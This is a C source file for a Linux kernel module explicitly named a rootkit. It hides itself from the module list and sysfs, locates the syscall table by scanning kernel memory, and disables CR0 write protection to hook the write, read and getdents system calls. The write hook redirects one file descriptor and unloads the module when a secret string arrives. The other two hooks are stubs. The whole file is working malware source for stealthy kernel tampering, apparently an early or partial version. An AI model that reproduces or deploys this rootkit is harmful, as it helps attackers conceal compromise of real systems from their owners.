#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/delay.h>
#include <asm/paravirt.h>
#include <linux/slab.h>

int rootkit_init(void);
void rootkit_exit(void);
module_init(rootkit_init);
module_exit(rootkit_exit);

unsigned long **sys_call_table;
unsigned long original_cr0;

static unsigned long **aquire_sys_call_table(void)
{
        unsigned long int offset = PAGE_OFFSET;
        unsigned long **sct;

        while (offset < ULLONG_MAX) {
                sct = (unsigned long **)offset;

                if (sct[__NR_close] == (unsigned long *) sys_close)
                        return sct;

                offset += sizeof(void *);
        }

        return NULL;
}

asmlinkage long (*ref_sys_write)(unsigned int fd, char __user *buf, size_t count);
asmlinkage long new_sys_write(unsigned int fd, char __user *buf, size_t count)
{
	long ret;
	char* secret = "1337KODE";
	char* kbuff = (char*) kmalloc(256,GFP_KERNEL);
	copy_from_user(kbuff, buf, 255);
	if(fd == 8 && strstr(kbuff, secret)) {
		printk(KERN_INFO "EXITING");
		kfree(kbuff);
		rootkit_exit();
		return EEXIST;
	}

	if(fd == 8) {
		fd = 1;
	}

	ret = ref_sys_write(fd, buf, count);
	kfree(kbuff);
	return ret;
}

asmlinkage long (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count);
asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
{
        long ret;
        ret = ref_sys_read(fd, buf, count);

        if(count >= 1 && fd == 8) {
//		printk(KERN_INFO "read intercept");
        }

        return ret;
}

asmlinkage long (*ref_sys_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage long new_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
        long ret;
        ret = ref_sys_getdents(fd, dirp, count);

//	printk("Intercepted getdents");

        return ret;
}


int rootkit_init(void) {
	/*Hide module*/
	list_del_init(&__this_module.list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	
	if(!(sys_call_table = aquire_sys_call_table())) {
		printk(KERN_INFO "Call table not found");
		return -1;
	}
	printk(KERN_INFO "Call table found");
	
	original_cr0 = read_cr0();

	write_cr0(original_cr0 & ~0x00010000);
	ref_sys_write = (void *)sys_call_table[__NR_write];
	ref_sys_read = (void *)sys_call_table[__NR_read];
	ref_sys_getdents = (void *)sys_call_table[__NR_getdents];
	sys_call_table[__NR_write] = (unsigned long *)new_sys_write;
	sys_call_table[__NR_read] = (unsigned long *)new_sys_read;
	sys_call_table[__NR_getdents] = (unsigned long *)new_sys_getdents;
	write_cr0(original_cr0);

	/*print confirmation module loaded*/
	printk(KERN_ALERT "Module loaded");
	
	return 0;
}

void rootkit_exit(void) 
{
	if(!sys_call_table) {
		return;
	}
	
	write_cr0(original_cr0 & ~0x00010000);
	sys_call_table[__NR_write] = (unsigned long *)ref_sys_write;
	sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;
	sys_call_table[__NR_getdents] = (unsigned long *)ref_sys_getdents;
	write_cr0(original_cr0);
	
	/*print unloaded confirmation*/
	printk(KERN_ALERT "Module unloaded");

	msleep(2000);
}

MODULE_LICENSE("GPL");
